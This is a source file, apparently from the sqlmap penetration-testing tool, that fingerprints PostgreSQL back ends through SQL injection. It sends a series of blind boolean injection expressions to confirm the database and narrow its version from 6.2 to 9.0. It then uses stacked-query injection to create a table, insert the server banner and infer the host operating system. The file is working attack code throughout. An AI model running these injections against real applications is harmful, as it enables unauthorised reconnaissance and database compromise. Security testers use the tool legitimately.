#!/usr/bin/env python

"""
$Id$

Copyright (c) 2006-2011 sqlmap developers (http://www.sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import re

from lib.core.agent import agent
from lib.core.common import Backend
from lib.core.common import Format
from lib.core.common import getUnicode
from lib.core.common import randomInt
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.enums import DBMS
from lib.core.enums import OS
from lib.core.session import setDbms
from lib.core.settings import PGSQL_ALIASES
from lib.core.settings import PGSQL_SYSTEM_DBS
from lib.request import inject
from lib.request.connect import Connect as Request

from plugins.generic.fingerprint import Fingerprint as GenericFingerprint

class Fingerprint(GenericFingerprint):
    def __init__(self):
        GenericFingerprint.__init__(self, DBMS.PGSQL)

    def getFingerprint(self):
        value = ""
        wsOsFp = Format.getOs("web server", kb.headersFp)

        if wsOsFp:
            value += "%s\n" % wsOsFp

        if kb.data.banner:
            dbmsOsFp = Format.getOs("back-end DBMS", kb.bannerFp)

            if dbmsOsFp:
                value += "%s\n" % dbmsOsFp

        value += "back-end DBMS: "

        if not conf.extensiveFp:
            value += DBMS.PGSQL
            return value

        actVer = Format.getDbms()
        blank = " " * 15
        value += "active fingerprint: %s" % actVer

        if kb.bannerFp:
            banVer = kb.bannerFp["dbmsVersion"] if 'dbmsVersion' in kb.bannerFp else None
            banVer = Format.getDbms([banVer])
            value += "\n%sbanner parsing fingerprint: %s" % (blank, banVer)

        htmlErrorFp = Format.getErrorParsedDBMSes()

        if htmlErrorFp:
            value += "\n%shtml error message fingerprint: %s" % (blank, htmlErrorFp)

        return value

    def checkDbms(self):
        """
        References for fingerprint:

        * http://www.postgresql.org/docs/8.4/interactive/release.html (up to 8.4.2)
        """

        if not conf.extensiveFp and (Backend.isDbmsWithin(PGSQL_ALIASES) or conf.dbms in PGSQL_ALIASES):
            setDbms(DBMS.PGSQL)

            self.getBanner()

            return True

        infoMsg = "testing %s" % DBMS.PGSQL
        logger.info(infoMsg)

        randInt = getUnicode(randomInt(1))
        result = inject.checkBooleanExpression("%s::int=%s" % (randInt, randInt))

        if result:
            infoMsg = "confirming %s" % DBMS.PGSQL
            logger.info(infoMsg)

            result = inject.checkBooleanExpression("COALESCE(%s, NULL)=%s" % (randInt, randInt))

            if not result:
                warnMsg = "the back-end DBMS is not %s" % DBMS.PGSQL
                logger.warn(warnMsg)

                return False

            setDbms(DBMS.PGSQL)

            self.getBanner()

            if not conf.extensiveFp:
                return True

            infoMsg = "actively fingerprinting %s" % DBMS.PGSQL
            logger.info(infoMsg)

            if inject.checkBooleanExpression("LENGTH(TO_CHAR(1, 'EEEE'))>0"):
                Backend.setVersion(">= 9.0.0")
            elif inject.checkBooleanExpression("2=(SELECT DIV(6, 3))"):
                Backend.setVersionList([">= 8.4.0", "< 9.0.0"])
            elif inject.checkBooleanExpression("EXTRACT(ISODOW FROM CURRENT_TIMESTAMP)<8"):
                Backend.setVersionList([">= 8.3.0", "< 8.4.0"])
            elif inject.checkBooleanExpression("ISFINITE(TRANSACTION_TIMESTAMP())"):
                Backend.setVersionList([">= 8.2.0", "< 8.3.0"])
            elif inject.checkBooleanExpression("9=(SELECT GREATEST(5, 9, 1))"):
                Backend.setVersionList([">= 8.1.0", "< 8.2.0"])
            elif inject.checkBooleanExpression("3=(SELECT WIDTH_BUCKET(5.35, 0.024, 10.06, 5))"):
                Backend.setVersionList([">= 8.0.0", "< 8.1.0"])
            elif inject.checkBooleanExpression("'d'=(SELECT SUBSTR(MD5('sqlmap'), 1, 1))"):
                Backend.setVersionList([">= 7.4.0", "< 8.0.0"])
            elif inject.checkBooleanExpression("'p'=(SELECT SUBSTR(CURRENT_SCHEMA(), 1, 1))"):
                Backend.setVersionList([">= 7.3.0", "< 7.4.0"])
            elif inject.checkBooleanExpression("8=(SELECT BIT_LENGTH(1))"):
                Backend.setVersionList([">= 7.2.0", "< 7.3.0"])
            elif inject.checkBooleanExpression("'a'=(SELECT SUBSTR(QUOTE_LITERAL('a'), 2, 1))"):
                Backend.setVersionList([">= 7.1.0", "< 7.2.0"])
            elif inject.checkBooleanExpression("8=(SELECT POW(2, 3))"):
                Backend.setVersionList([">= 7.0.0", "< 7.1.0"])
            elif inject.checkBooleanExpression("'a'=(SELECT MAX('a'))"):
                Backend.setVersionList([">= 6.5.0", "< 6.5.3"])
            elif inject.checkBooleanExpression("VERSION()=VERSION()"):
                Backend.setVersionList([">= 6.4.0", "< 6.5.0"])
            elif inject.checkBooleanExpression("2=(SELECT SUBSTR(CURRENT_DATE, 1, 1))"):
                Backend.setVersionList([">= 6.3.0", "< 6.4.0"])
            elif inject.checkBooleanExpression("'s'=(SELECT SUBSTRING('sqlmap', 1, 1))"):
                Backend.setVersionList([">= 6.2.0", "< 6.3.0"])
            else:
                Backend.setVersion("< 6.2.0")

            return True
        else:
            warnMsg = "the back-end DBMS is not %s" % DBMS.PGSQL
            logger.warn(warnMsg)

            return False

    def checkDbmsOs(self, detailed=False):
        if Backend.getOs():
            return

        infoMsg = "fingerprinting the back-end DBMS operating system"
        logger.info(infoMsg)

        self.createSupportTbl(self.fileTblName, self.tblField, "character(10000)")
        inject.goStacked("INSERT INTO %s(%s) VALUES (%s)" % (self.fileTblName, self.tblField, "VERSION()"))

        # Windows executables should always have ' Visual C++' or ' mingw'
        # patterns within the banner
        osWindows = ( " Visual C++", "mingw" )

        for osPattern in osWindows:
            query = "(SELECT LENGTH(%s) FROM %s WHERE %s " % (self.tblField, self.fileTblName, self.tblField)
            query += "LIKE '%" + osPattern + "%')>0"

            if inject.checkBooleanExpression(query):
                Backend.setOs(OS.WINDOWS)

                break

        if Backend.getOs() is None:
            Backend.setOs(OS.LINUX)

        infoMsg = "the back-end DBMS operating system is %s" % Backend.getOs()
        logger.info(infoMsg)

        self.cleanup(onlyFileTbl=True)

    def forceDbmsEnum(self):
        if conf.db not in PGSQL_SYSTEM_DBS and conf.db != "public":
            conf.db = "public"

            warnMsg = "on %s it is only possible to enumerate " % DBMS.PGSQL
            warnMsg += "on the current schema and on system databases, "
            warnMsg += "sqlmap is going to use 'public' schema as "
            warnMsg += "database name"
            logger.warn(warnMsg)
